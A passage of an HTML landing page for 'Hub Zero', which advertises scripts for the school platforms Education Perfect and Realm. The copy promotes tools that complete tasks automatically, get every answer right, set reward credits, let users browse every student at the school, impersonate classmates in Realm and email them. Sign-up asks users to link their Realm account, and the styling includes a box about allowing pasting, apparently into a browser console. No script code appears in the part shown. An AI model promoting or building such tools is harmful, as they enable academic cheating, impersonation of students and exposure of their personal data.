<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Hub Zero</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&family=Instrument+Serif:ital@0;1&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
  :root {
    --bg: #050505;
    --surface: #111111;
    --surface2: #181818;
    --border: #222222;
    --fg: #f5f5f5;
    --muted: #888888;
    --accent: #d4ff3a;
    --accent-dim: rgba(212,255,58,0.12);
    --ease: cubic-bezier(0.16, 1, 0.3, 1);
  }

  *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
  html { scroll-behavior: smooth; }

  body {
    background: var(--bg);
    color: var(--fg);
    font-family: 'Syne', sans-serif;
    -webkit-font-smoothing: antialiased;
    overflow-x: hidden;
  }

  ::selection { background: var(--accent); color: #000; }

  /* ─── LOADER ─── */
  .loader {
    position: fixed; inset: 0;
    background: var(--bg);
    z-index: 9999;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: opacity 0.6s ease 0.3s, visibility 0.6s ease 0.3s;
  }
  .loader.gone { opacity: 0; visibility: hidden; }
  .loader-word {
    font-size: 14px;
    font-weight: 700;
    letter-spacing: 0.4em;
    color: var(--accent);
    font-family: 'JetBrains Mono', monospace;
    animation: pulse 1s ease-in-out infinite;
  }
  @keyframes pulse { 0%,100%{opacity:.4} 50%{opacity:1} }

  /* ─── PROGRESS BAR ─── */
  #progress {
    position: fixed; top: 0; left: 0;
    height: 2px;
    background: var(--accent);
    z-index: 1001;
    width: 0;
    transition: width 0.1s linear;
  }

  /* ─── NAV ─── */
  nav {
    position: fixed;
    top: 0; left: 0; right: 0;
    z-index: 100;
    background: rgba(5,5,5,0.92);
    backdrop-filter: blur(16px);
    border-bottom: 1px solid var(--border);
    padding: 0 32px;
    height: 60px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    opacity: 0;
    transition: opacity 0.5s ease 0.4s;
  }
  nav.show { opacity: 1; }

  .nav-logo {
    font-weight: 800;
    font-size: 17px;
    letter-spacing: -0.03em;
    color: var(--fg);
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .nav-logo .dot {
    width: 7px; height: 7px;
    border-radius: 50%;
    background: var(--accent);
    display: inline-block;
  }

  .nav-links {
    display: flex;
    align-items: center;
    gap: 8px;
    list-style: none;
  }
  .nav-links a {
    text-decoration: none;
    font-family: 'JetBrains Mono', monospace;
    font-size: 12px;
    font-weight: 500;
    letter-spacing: 0.08em;
    color: var(--muted);
    padding: 6px 12px;
    border-radius: 4px;
    transition: color 0.2s ease, background 0.2s ease;
  }
  .nav-links a:hover { color: var(--fg); background: rgba(255,255,255,0.05); }
  .nav-links .nav-cta a {
    background: var(--accent);
    color: #000;
    font-weight: 700;
  }
  .nav-links .nav-cta a:hover {
    background: #e2ff60;
    color: #000;
  }

  /* ─── HERO ─── */
  .hero {
    min-height: 100vh;
    padding: 120px 32px 80px;
    display: flex;
    flex-direction: column;
    justify-content: center;
    position: relative;
  }

  /* Subtle grid background */
  .hero::before {
    content: '';
    position: absolute;
    inset: 0;
    background-image:
      linear-gradient(var(--border) 1px, transparent 1px),
      linear-gradient(90deg, var(--border) 1px, transparent 1px);
    background-size: 60px 60px;
    opacity: 0.3;
    mask-image: radial-gradient(ellipse 80% 80% at 50% 30%, black 40%, transparent 100%);
    pointer-events: none;
  }

  .hero-inner {
    max-width: 900px;
    margin: 0 auto;
    width: 100%;
    position: relative;
  }

  .hero-eyebrow {
    font-family: 'JetBrains Mono', monospace;
    font-size: 11px;
    font-weight: 600;
    letter-spacing: 0.25em;
    color: var(--accent);
    text-transform: uppercase;
    margin-bottom: 28px;
    opacity: 0;
    transform: translateY(10px);
    transition: all 0.6s var(--ease) 0.5s;
  }
  .hero-eyebrow.show { opacity: 1; transform: translateY(0); }

  .hero-heading {
    font-size: clamp(52px, 9vw, 110px);
    font-weight: 800;
    line-height: 0.92;
    letter-spacing: -0.04em;
    margin-bottom: 32px;
  }
  .hero-heading .line {
    display: block;
    overflow: hidden;
  }
  .hero-heading .line span {
    display: block;
    transform: translateY(100%);
    transition: transform 0.9s var(--ease);
  }
  .hero-heading .line:nth-child(1) span { transition-delay: 0.55s; }
  .hero-heading .line:nth-child(2) span { transition-delay: 0.7s; }
  .hero-heading .line span.show { transform: translateY(0); }

  .hero-heading em {
    font-family: 'Instrument Serif', serif;
    font-style: italic;
    font-weight: 400;
    color: var(--accent);
  }

  .hero-sub {
    font-size: 17px;
    color: #aaaaaa;
    line-height: 1.65;
    max-width: 520px;
    margin-bottom: 44px;
    font-weight: 400;
    opacity: 0;
    transform: translateY(12px);
    transition: all 0.7s var(--ease) 0.9s;
  }
  .hero-sub.show { opacity: 1; transform: translateY(0); }

  .hero-actions {
    display: flex;
    gap: 12px;
    flex-wrap: wrap;
    opacity: 0;
    transform: translateY(12px);
    transition: all 0.7s var(--ease) 1.05s;
  }
  .hero-actions.show { opacity: 1; transform: translateY(0); }

  /* ─── BUTTONS ─── */
  .btn {
    font-family: 'JetBrains Mono', monospace;
    font-size: 12px;
    font-weight: 700;
    letter-spacing: 0.1em;
    text-transform: uppercase;
    padding: 14px 28px;
    border-radius: 5px;
    cursor: pointer;
    border: 2px solid transparent;
    transition: all 0.2s ease;
    display: inline-flex;
    align-items: center;
    gap: 8px;
    text-decoration: none;
  }
  .btn-primary {
    background: var(--accent);
    color: #000;
    border-color: var(--accent);
  }
  .btn-primary:hover {
    background: #e2ff60;
    border-color: #e2ff60;
    transform: translateY(-1px);
    box-shadow: 0 6px 20px rgba(212,255,58,0.25);
  }
  .btn-secondary {
    background: transparent;
    color: var(--fg);
    border-color: var(--border);
  }
  .btn-secondary:hover {
    border-color: #555;
    background: rgba(255,255,255,0.04);
  }
  .btn:disabled {
    background: #1c1c1c !important;
    border-color: #1c1c1c !important;
    color: #444 !important;
    cursor: not-allowed !important;
    transform: none !important;
    box-shadow: none !important;
  }
  .btn-warning {
    background: rgba(245, 158, 11, 0.12);
    color: #fbbf24;
    border-color: rgba(245, 158, 11, 0.35);
  }
  .btn-warning:hover {
    background: rgba(245, 158, 11, 0.22);
    border-color: #f59e0b;
    color: #fff;
    transform: translateY(-1px);
    box-shadow: 0 6px 20px rgba(245, 158, 11, 0.25);
  }
  .btn-danger {
    background: rgba(239, 68, 68, 0.12);
    color: #f87171;
    border-color: rgba(239, 68, 68, 0.35);
  }
  .btn-danger:hover {
    background: rgba(239, 68, 68, 0.22);
    border-color: #ef4444;
    color: #fff;
    transform: translateY(-1px);
    box-shadow: 0 6px 20px rgba(239, 68, 68, 0.25);
  }

  /* ─── SCROLL INDICATOR ─── */
  .scroll-hint {
    position: absolute;
    bottom: 40px;
    left: 50%;
    transform: translateX(-50%);
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 8px;
    opacity: 0;
    transition: opacity 0.6s ease 1.4s;
  }
  .scroll-hint.show { opacity: 1; }
  .scroll-hint span {
    font-family: 'JetBrains Mono', monospace;
    font-size: 10px;
    letter-spacing: 0.2em;
    color: var(--muted);
    text-transform: uppercase;
  }
  .scroll-arrow {
    width: 1px;
    height: 40px;
    background: linear-gradient(to bottom, var(--border), transparent);
    position: relative;
    overflow: hidden;
  }
  .scroll-arrow::after {
    content: '';
    position: absolute;
    top: -100%;
    left: 0;
    width: 100%;
    height: 100%;
    background: var(--accent);
    animation: drip 2s ease-in-out infinite;
  }
  @keyframes drip {
    0% { top: -100%; }
    100% { top: 200%; }
  }

  /* ─── SECTION COMMON ─── */
  section {
    padding: 100px 32px;
    position: relative;
  }
  section + section {
    border-top: 1px solid var(--border);
  }

  .section-inner {
    max-width: 1000px;
    margin: 0 auto;
  }

  .section-label {
    font-family: 'JetBrains Mono', monospace;
    font-size: 10px;
    font-weight: 600;
    letter-spacing: 0.3em;
    text-transform: uppercase;
    color: var(--muted);
    margin-bottom: 20px;
    display: flex;
    align-items: center;
    gap: 12px;
  }
  .section-label::before {
    content: '';
    display: block;
    width: 20px;
    height: 1px;
    background: var(--accent);
  }

  .section-title {
    font-size: clamp(30px, 5vw, 54px);
    font-weight: 800;
    letter-spacing: -0.03em;
    line-height: 1.05;
    margin-bottom: 16px;
  }
  .section-title em {
    font-family: 'Instrument Serif', serif;
    font-style: italic;
    font-weight: 400;
    color: var(--accent);
  }

  /* ─── ABOUT SECTION ─── */
  .about-grid {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 20px;
    margin-top: 56px;
  }
  @media (max-width: 700px) {
    .about-grid { grid-template-columns: 1fr; }
  }

  .about-card {
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 10px;
    padding: 32px;
    transition: border-color 0.25s ease, transform 0.25s ease;
    cursor: pointer;
    position: relative;
    overflow: hidden;
  }
  .about-card::before {
    content: '';
    position: absolute;
    top: 0; left: 0; right: 0;
    height: 2px;
    background: var(--accent);
    transform: scaleX(0);
    transform-origin: left;
    transition: transform 0.3s var(--ease);
  }
  .about-card:hover {
    border-color: #333;
    transform: translateY(-3px);
  }
  .about-card:hover::before { transform: scaleX(1); }

  .card-tag {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    font-family: 'JetBrains Mono', monospace;
    font-size: 10px;
    font-weight: 600;
    letter-spacing: 0.15em;
    text-transform: uppercase;
    color: var(--accent);
    background: var(--accent-dim);
    padding: 4px 10px;
    border-radius: 3px;
    margin-bottom: 20px;
  }

  .about-card h3 {
    font-size: 22px;
    font-weight: 700;
    letter-spacing: -0.02em;
    margin-bottom: 12px;
    color: var(--fg);
  }
  .about-card p {
    font-size: 14.5px;
    color: #999;
    line-height: 1.7;
  }

  .about-card .feature-list {
    list-style: none;
    margin-top: 20px;
    display: flex;
    flex-direction: column;
    gap: 7px;
  }
  .about-card .feature-list li {
    font-size: 13px;
    color: #bbb;
    display: flex;
    align-items: flex-start;
    gap: 8px;
    line-height: 1.5;
  }
  .about-card .feature-list li::before {
    content: '→';
    color: var(--accent);
    font-size: 12px;
    margin-top: 1px;
    flex-shrink: 0;
  }

  /* ─── HOW IT WORKS ─── */
  .steps {
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    gap: 1px;
    margin-top: 56px;
    background: var(--border);
    border: 1px solid var(--border);
    border-radius: 10px;
    overflow: hidden;
  }
  @media (max-width: 700px) {
    .steps { grid-template-columns: 1fr; }
  }

  .step {
    background: var(--surface);
    padding: 36px 32px;
    transition: background 0.2s ease;
  }
  .step:hover { background: var(--surface2); }

  .step-num {
    font-family: 'JetBrains Mono', monospace;
    font-size: 11px;
    font-weight: 600;
    letter-spacing: 0.15em;
    color: var(--accent);
    margin-bottom: 16px;
    display: block;
  }
  .step h3 {
    font-size: 19px;
    font-weight: 700;
    letter-spacing: -0.01em;
    margin-bottom: 0;
    line-height: 1.35;
  }

  /* ─── GALLERY CAROUSEL ─── */
  .gallery-carousel-wrapper {
    position: relative;
    max-width: 900px;
    margin: 56px auto 0;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .gallery-track-container {
    width: 100%;
    overflow: hidden;
    display: flex;
    justify-content: center;
    align-items: center;
  }
  .gallery-track {
    display: flex;
    align-items: center;
    transition: transform 0.5s cubic-bezier(0.16, 1, 0.3, 1);
    width: 100%;
  }
  .gallery-slide {
    min-width: 100%;
    box-sizing: border-box;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 10px 16px;
    cursor: zoom-in;
  }
  .gallery-card {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    background: rgba(13, 19, 31, 0.6);
    border: 1px solid rgba(255, 255, 255, 0.08);
    border-radius: 14px;
    padding: 8px;
    box-shadow: 0 20px 50px rgba(0, 0, 0, 0.55);
    max-width: 100%;
    margin: 0 auto;
    transition: border-color 0.3s ease, box-shadow 0.3s ease;
  }
  .gallery-card:hover {
    border-color: rgba(212, 255, 58, 0.35);
    box-shadow: 0 25px 60px rgba(0, 0, 0, 0.7), 0 0 24px rgba(212, 255, 58, 0.05);
  }
  .gallery-slide img {
    max-width: 100%;
    max-height: 480px;
    width: auto;
    height: auto;
    display: block;
    border-radius: 8px;
    filter: brightness(0.95);
    transition: filter 0.3s ease;
  }
  .gallery-slide:hover img {
    filter: brightness(1.04);
  }
  .gallery-nav-btn {
    position: absolute;
    top: 50%;
    transform: translateY(-50%);
    z-index: 10;
    background: rgba(8, 12, 20, 0.85);
    border: 1px solid rgba(255, 255, 255, 0.12);
    color: #e2e8f0;
    width: 40px;
    height: 40px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    backdrop-filter: blur(10px);
    transition: all 0.2s ease;
  }
  .gallery-nav-btn:hover {
    background: var(--accent);
    color: #000;
    border-color: var(--accent);
    transform: translateY(-50%) scale(1.08);
    box-shadow: 0 0 16px rgba(212, 255, 58, 0.4);
  }
  .gallery-nav-btn.prev { left: -22px; }
  .gallery-nav-btn.next { right: -22px; }
  @media (max-width: 920px) {
    .gallery-nav-btn.prev { left: 10px; }
    .gallery-nav-btn.next { right: 10px; }
  }

  .gallery-indicators {
    display: flex;
    justify-content: center;
    gap: 8px;
    margin-top: 20px;
  }
  .gallery-dot {
    width: 8px;
    height: 8px;
    border-radius: 50%;
    background: rgba(255, 255, 255, 0.2);
    border: none;
    cursor: pointer;
    padding: 0;
    transition: all 0.3s ease;
  }
  .gallery-dot.active {
    width: 24px;
    border-radius: 4px;
    background: var(--accent);
    box-shadow: 0 0 10px rgba(212, 255, 58, 0.5);
  }

  /* ─── LIGHTBOX ─── */
  .lightbox-overlay {
    position: fixed; inset: 0;
    background: rgba(0,0,0,0.95);
    backdrop-filter: blur(15px);
    z-index: 11000;
    display: flex;
    align-items: center;
    justify-content: center;
    opacity: 0;
    pointer-events: none;
    transition: opacity 0.3s ease;
    padding: 24px;
  }
  .lightbox-overlay.active {
    opacity: 1;
    pointer-events: auto;
  }
  .lightbox-image {
    max-width: 95%;
    max-height: 90vh;
    object-fit: contain;
    border-radius: 8px;
    box-shadow: 0 20px 60px rgba(0,0,0,0.8);
    transform: scale(0.95);
    transition: transform 0.3s var(--ease);
  }
  .lightbox-overlay.active .lightbox-image {
    transform: scale(1);
  }
  .lightbox-close {
    position: absolute;
    top: 24px;
    right: 32px;
    background: none;
    border: none;
    color: #fff;
    font-size: 40px;
    cursor: pointer;
    transition: color 0.2s, transform 0.2s;
  }
  .lightbox-close:hover {
    color: var(--accent);
    transform: scale(1.1);
  }

  /* ─── GET SCRIPTS CTA ─── */
  .cta-section {
    text-align: center;
    padding: 120px 32px;
  }

  .cta-box {
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 14px;
    padding: 72px 48px;
    max-width: 700px;
    margin: 0 auto;
    position: relative;
    overflow: hidden;
  }
  .cta-box::before {
    content: '';
    position: absolute;
    top: -1px; left: 20%; right: 20%;
    height: 2px;
    background: var(--accent);
    border-radius: 0 0 4px 4px;
  }

  .cta-box .section-title { margin-bottom: 16px; }

  .cta-tagline {
    font-size: 16px;
    color: #888;
    margin-bottom: 40px;
    line-height: 1.6;
  }

  .cta-note {
    margin-top: 20px;
    font-family: 'JetBrains Mono', monospace;
    font-size: 11px;
    color: #555;
    letter-spacing: 0.08em;
  }

  /* ─── LOGGED-IN WELCOME ─── */
  .welcome-section {
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 14px;
    padding: 40px;
    margin-top: 48px;
    display: none;
    max-width: 620px;
    margin-left: auto;
    margin-right: auto;
    text-align: center;
  }
  .welcome-section h2 {
    font-size: 26px;
    font-weight: 700;
    letter-spacing: -0.02em;
    margin-bottom: 24px;
  }
  .highlight-green { color: var(--accent); }
  .welcome-actions {
    display: flex;
    gap: 12px;
    justify-content: center;
    flex-wrap: wrap;
  }

  /* ─── DASHBOARD (LOGGED IN) ─── */
  .dashboard-section {
    padding: 100px 32px 120px;
    display: none;
  }
  .dashboard-inner {
    max-width: 760px;
    margin: 0 auto;
    display: flex;
    flex-direction: column;
    gap: 48px;
  }

  .loader-card-box {
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 14px;
    padding: 48px 40px;
  }
  .dashboard-desc {
    font-family: 'Plus Jakarta Sans', sans-serif;
    font-size: 15px;
    color: #94a3b8;
    line-height: 1.6;
    margin-top: 14px;
  }

  .code-box {
    background: #080808;
    border: 1px solid var(--border);
    border-radius: 8px;
    padding: 14px 18px;
    display: flex;
    align-items: center;
    gap: 12px;
    margin-top: 28px;
  }
  .code-input {
    flex: 1;
    background: transparent;
    border: none;
    outline: none;
    font-family: 'JetBrains Mono', monospace;
    font-size: 13px;
    color: #cbd5e1;
    width: 100%;
    min-width: 0;
    user-select: all;
  }
  .code-copy-btn {
    font-family: 'JetBrains Mono', monospace;
    font-size: 11px;
    font-weight: 700;
    letter-spacing: 0.1em;
    text-transform: uppercase;
    background: var(--accent);
    color: #000;
    border: 2px solid var(--accent);
    padding: 10px 18px;
    border-radius: 4px;
    cursor: pointer;
    white-space: nowrap;
    transition: all 0.2s ease;
    flex-shrink: 0;
    display: inline-flex;
    align-items: center;
    gap: 6px;
  }
  .code-copy-btn:hover {
    background: transparent;
    color: var(--accent);
  }
  .code-meta-hint {
    margin-top: 14px;
    display: flex;
    align-items: center;
    gap: 6px;
    font-family: 'Plus Jakarta Sans', sans-serif;
    font-size: 12.5px;
    color: #64748b;
  }

  /* ─── ALLOW PASTING TROUBLESHOOTING BOX ─── */
  .allow-pasting-box {
    background: var(--surface);
    border: 1px solid rgba(245, 158, 11, 0.3);
    border-radius: 14px;
    padding: 36px 40px;
    display: flex;
    flex-direction: column;
    gap: 16px;
  }
  .pasting-badge {
    display: inline-flex;
    align-items: center;
    gap: 8px;
    font-family: 'JetBrains Mono', monospace;
    font-size: 11px;
    font-weight: 700;
    letter-spacing: 0.1em;
    text-transform: uppercase;
    color: #fbbf24;
    background: rgba(245, 158, 11, 0.12);
    border: 1px solid rgba(245, 158, 11, 0.25);
    padding: 4px 10px;
    border-radius: 4px;
    align-self: flex-start;
  }
  .pasting-title {
    font-family: 'Plus Jakarta Sans', 'Syne', sans-serif;
    font-size: 18px;
    font-weight: 700;
    color: #f8fafc;
    letter-spacing: -0.01em;
    text-transform: uppercase;
  }
  .pasting-desc {
    font-family: 'Plus Jakarta Sans', sans-serif;
    font-size: 14.5px;
    color: #cbd5e1;
    line-height: 1.65;
  }
  .pasting-kbd {
    background: #1e2433;
    border: 1px solid #334155;
    border-radius: 4px;
    padding: 2px 8px;
    font-family: 'JetBrains Mono', monospace;
    font-size: 12.5px;
    color: #fbbf24;
    font-weight: 700;
  }

  kbd {
    background: #1e2433;
    border: 1px solid #334155;
    border-radius: 4px;
    padding: 2px 6px;
    font-family: 'JetBrains Mono', monospace;
    font-size: 11.5px;
    color: #f1f5f9;
    box-shadow: 0 1px 2px rgba(0,0,0,0.5);
    display: inline-block;
  }

  /* ─── FOOTER ─── */
  footer {
    border-top: 1px solid var(--border);
    padding: 60px 32px 32px;
  }
  .footer-inner {
    max-width: 1000px;
    margin: 0 auto;
    display: flex;
    justify-content: space-between;
    align-items: flex-end;
    flex-wrap: wrap;
    gap: 32px;
  }
  .footer-brand .footer-logo {
    font-size: 36px;
    font-weight: 800;
    letter-spacing: -0.03em;
    color: var(--fg);
    display: flex;
    align-items: center;
    gap: 6px;
    margin-bottom: 8px;
  }
  .footer-brand .footer-logo em {
    font-family: 'Instrument Serif', serif;
    font-style: italic;
    font-weight: 400;
    color: var(--accent);
  }
  .footer-brand p {
    font-size: 13px;
    color: var(--muted);
  }
  .footer-meta {
    font-family: 'JetBrains Mono', monospace;
    font-size: 10px;
    letter-spacing: 0.2em;
    color: #444;
    text-transform: uppercase;
    text-align: right;
  }
  .footer-meta span { display: block; margin-bottom: 4px; }

  /* ─── FADE-UP REVEAL ─── */
  .reveal {
    opacity: 0;
    transform: translateY(18px);
    transition: opacity 0.75s var(--ease), transform 0.75s var(--ease);
  }
  .reveal.d1 { transition-delay: 0.1s; }
  .reveal.d2 { transition-delay: 0.2s; }
  .reveal.d3 { transition-delay: 0.3s; }
  .reveal.visible { opacity: 1; transform: translateY(0); }

  /* ─── MODAL ─── */
  body.modal-open { overflow: hidden; }

  .modal-overlay {
    position: fixed; inset: 0;
    background: rgba(0,0,0,0.92);
    backdrop-filter: blur(12px);
    z-index: 10000;
    display: flex;
    align-items: flex-start;
    justify-content: center;
    opacity: 0;
    pointer-events: none;
    transition: opacity 0.35s ease;
    padding: 60px 10px;
    overflow-y: auto;
  }
  .modal-overlay.active {
    opacity: 1;
    pointer-events: auto;
  }
  .modal-box {
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 12px;
    padding: 40px;
    max-width: 580px;
    width: 92%;
    transform: scale(0.97) translateY(-16px);
    transition: transform 0.35s var(--ease);
    position: relative;
    margin-bottom: 40px;
  }
  .modal-overlay.active .modal-box {
    transform: scale(1) translateY(0);
  }

  .modal-step { display: none; flex-direction: column; }
  .modal-step.show { display: flex; }

  .modal-label {
    font-family: 'JetBrains Mono', monospace;
    font-size: 10px;
    letter-spacing: 0.25em;
    text-transform: uppercase;
    color: var(--muted);
    margin-bottom: 12px;
  }
  .modal-title {
    font-size: 22px;
    font-weight: 800;
    letter-spacing: -0.02em;
    margin-bottom: 20px;
    color: var(--fg);
  }
  .modal-title.green { color: var(--accent); }
  .modal-title.red { color: #f87171; }

  .modal-body {
    font-size: 14.5px;
    color: #bbb;
    line-height: 1.7;
    margin-bottom: 20px;
  }

  .modal-scroll {
    max-height: 400px;
    overflow-y: auto;
    padding-right: 12px;
    margin-bottom: 24px;
  }
  .modal-scroll::-webkit-scrollbar { width: 5px; }
  .modal-scroll::-webkit-scrollbar-track { background: transparent; }
  .modal-scroll::-webkit-scrollbar-thumb { background: #2a2a2a; border-radius: 3px; }

  .modal-section {
    background: rgba(255, 255, 255, 0.02);
    border: 1px solid var(--border);
    border-radius: 10px;
    padding: 20px;
    margin-bottom: 16px;
    transition: border-color 0.2s ease, background 0.2s ease;
  }
  .modal-section:hover {
    border-color: rgba(255, 255, 255, 0.12);
  }
  .modal-section-title {
    font-family: 'JetBrains Mono', monospace;
    font-size: 11px;
    font-weight: 700;
    letter-spacing: 0.12em;
    text-transform: uppercase;
    color: var(--accent);
    margin-bottom: 8px;
  }
  .modal-section-text {
    font-family: 'Plus Jakarta Sans', sans-serif;
    font-size: 13.5px;
    color: #cbd5e1;
    line-height: 1.6;
    margin: 0 0 14px;
  }
  .modal-section-text strong {
    color: #fff;
  }
  .modal-check-label {
    display: flex;
    align-items: center;
    gap: 10px;
    font-family: 'Plus Jakarta Sans', sans-serif;
    font-size: 12.5px;
    font-weight: 600;
    color: #94a3b8;
    cursor: pointer;
    user-select: none;
    background: rgba(255, 255, 255, 0.03);
    border: 1px solid rgba(255, 255, 255, 0.06);
    border-radius: 6px;
    padding: 8px 12px;
    transition: all 0.2s ease;
  }
  .modal-check-label:hover {
    background: rgba(255, 255, 255, 0.06);
    color: #f1f5f9;
  }
  .modal-check-label input[type="checkbox"] {
    accent-color: var(--accent);
    cursor: pointer;
    width: 15px;
    height: 15px;
    flex-shrink: 0;
  }
  .modal-check-label:has(input:checked) {
    background: rgba(212, 255, 58, 0.08);
    border-color: rgba(212, 255, 58, 0.3);
    color: #f8fafc;
  }
  .modal-warning-subtle {
    font-family: 'JetBrains Mono', monospace;
    font-size: 11px;
    color: #fca5a5;
    background: rgba(239, 68, 68, 0.08);
    border: 1px solid rgba(239, 68, 68, 0.22);
    border-radius: 6px;
    padding: 12px 16px;
    margin: 16px 0 6px;
    line-height: 1.55;
    word-break: break-word;
    white-space: normal;
  }

  .modal-footer {
    display: flex;
    justify-content: flex-end;
    gap: 12px;
    margin-top: 24px;
  }

  /* Redirecting step */
  .modal-redirect {
    text-align: center;
    padding: 40px 0;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 16px;
  }
  .modal-redirect .modal-title { margin-bottom: 0; }
  .redirect-dots { color: var(--accent); }

  /* ─── MOBILE TWEAKS ─── */
  @media (max-width: 600px) {
    nav { padding: 0 20px; }
    .hero { padding: 100px 20px 70px; }
    section { padding: 72px 20px; }
    .cta-box { padding: 48px 24px; }
    .modal-box { padding: 28px 20px; }
    footer { padding: 48px 20px 24px; }
    .footer-inner { flex-direction: column; align-items: flex-start; }
    .footer-meta { text-align: left; }
    .steps { grid-template-columns: 1fr; }
  }
</style>
</head>
<body>

<!-- Loader -->
<div class="loader" id="loader">
  <span class="loader-word">HUB ZERO</span>
</div>

<!-- Scroll progress -->
<div id="progress"></div>

<!-- Nav -->
<nav id="main-nav">
  <div class="nav-logo">HUB ZERO<span class="dot"></span></div>
  <ul class="nav-links" id="nav-non-logged">
    <li><a href="#about">Scripts</a></li>
    <li><a href="#how">How it works</a></li>
    <li><a href="#gallery">Gallery</a></li>
    <li class="nav-cta"><a href="#get-scripts" id="nav-get-scripts">Get Scripts</a></li>
  </ul>
  <ul class="nav-links" id="nav-logged" style="display:none;">
    <li><a href="#dashboard">Script</a></li>
    <li><a href="#common-issues">Common Issues</a></li>
    <li class="nav-cta"><a href="#dashboard" id="nav-dash-cta">Get Script</a></li>
  </ul>
</nav>

<!-- ─── HERO ─── -->
<section class="hero" id="top">
  <div class="hero-inner">
    <p class="hero-eyebrow" id="hero-eyebrow" style="display: none;"></p>

    <h1 class="hero-heading">
      <span class="line"><span id="line1">Hub</span></span>
      <span class="line"><span id="line2">Zero<em>.</em></span></span>
    </h1>

    <p class="hero-sub" id="hero-sub">
      Custom scripts for the sites you use every day at school.
      Right now: <strong style="color:#e2e8f0;">Education Perfect</strong> and <strong style="color:#e2e8f0;">Realm</strong> — with more on the way.
    </p>

    <!-- Non-logged in actions -->
    <div class="hero-actions" id="hero-actions-anon">
      <button class="btn btn-primary" id="btn-get-loader">Get Scripts</button>
      <a class="btn btn-secondary" href="#about">See what's included</a>
    </div>

    <!-- Logged in welcome -->
    <div class="welcome-section" id="logged-in-welcome">
      <h2>Welcome back, <span class="highlight-green" id="welcome-username">User</span>.</h2>
      <div class="welcome-actions">
        <button class="btn btn-primary" id="btn-hero-get-script">Get Script</button>
        <button class="btn btn-warning" id="btn-relink-realm">
          <svg viewBox="0 0 24 24" width="14" height="14" stroke="currentColor" stroke-width="2.5" fill="none"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
          Relink Realm
        </button>
        <button class="btn btn-danger" id="btn-logout-dashboard">Log out</button>
      </div>
    </div>
  </div>

  <div class="scroll-hint" id="scroll-hint">
    <div class="scroll-arrow"></div>
    <span>Scroll</span>
  </div>
</section>

<!-- ─── NON-LOGGED-IN SECTIONS ─── -->
<div id="non-logged-sections">

  <!-- What's included -->
  <section id="about">
    <div class="section-inner">
      <p class="section-label reveal">What's included</p>
      <h2 class="section-title reveal d1">Two scripts.<br><em>A lot of features.</em></h2>

      <div class="about-grid">
        <!-- Card 1 -->
        <div class="about-card reveal d1" id="card-realm">
          <span class="card-tag">Realm</span>
          <h3>Student Searcher</h3>
          <p>Browse every student at your school, all from within Realm.</p>
          <ul class="feature-list">
            <li>Search any student by name or year level</li>
            <li>Impersonate them on your Realm homepage</li>
            <li>Send them an email straight from Realm</li>
            <li>Browse the full school by year group</li>
            <li>More features added at user request</li>
          </ul>
        </div>

        <!-- Card 2 -->
        <div class="about-card reveal d2" id="card-ep">
          <span class="card-tag">Education Perfect</span>
          <h3>EP Script Hub</h3>
          <p>A toolkit that handles the boring stuff on EP so you don't have to.</p>
          <ul class="feature-list">
            <li>Complete any task automatically</li>
            <li>Get every answer right</li>
            <li>Set or give your cheer credits</li>
            <li>Check &amp; send cheers without scrolling the leaderboard</li>
            <li>Auto-complete information slides</li>
          </ul>
        </div>
      </div>
    </div>
  </section>

  <!-- How it works -->
  <section id="how">
    <div class="section-inner">
      <p class="section-label reveal">Getting started</p>
      <h2 class="section-title reveal d1">Three steps.<br><em>That's all.</em></h2>

      <div class="steps reveal d2">
        <div class="step">
          <span class="step-num">STEP 01</span>
          <h3>Link to Realm Account</h3>
        </div>
        <div class="step">
          <span class="step-num">STEP 02</span>
          <h3>Wait for verification to complete (10s~)</h3>
        </div>
        <div class="step">
          <span class="step-num">STEP 03</span>
          <h3>You will be provided with the script loader</h3>
        </div>
      </div>
    </div>
  </section>

  <!-- Gallery -->
  <section id="gallery">
    <div class="section-inner">
      <p class="section-label reveal">In action</p>
      <h2 class="section-title reveal d1">See what it<br><em>looks like.</em></h2>

      <div class="gallery-carousel-wrapper reveal d2">
        <button class="gallery-nav-btn prev" id="gallery-prev" aria-label="Previous image">
          <svg viewBox="0 0 24 24" width="18" height="18" stroke="currentColor" stroke-width="2.5" fill="none"><polyline points="15 18 9 12 15 6"></polyline></svg>
        </button>
        <div class="gallery-track-container" id="gallery-track-container">
          <div class="gallery-track" id="gallery-track">
            <div class="gallery-slide" data-index="0">
              <div class="gallery-card">
                <img src="Student_Search.png" alt="Realm student search" loading="lazy">
              </div>
            </div>
            <div class="gallery-slide" data-index="1">
              <div class="gallery-card">
                <img src="Year_Browse.png" alt="Realm year group browser" loading="lazy">
              </div>
            </div>
            <div class="gallery-slide" data-index="2">
              <div class="gallery-card">
                <img src="Student_Profile.png" alt="Detailed student profile" loading="lazy">
              </div>
            </div>
            <div class="gallery-slide" data-index="3">
              <div class="gallery-card">
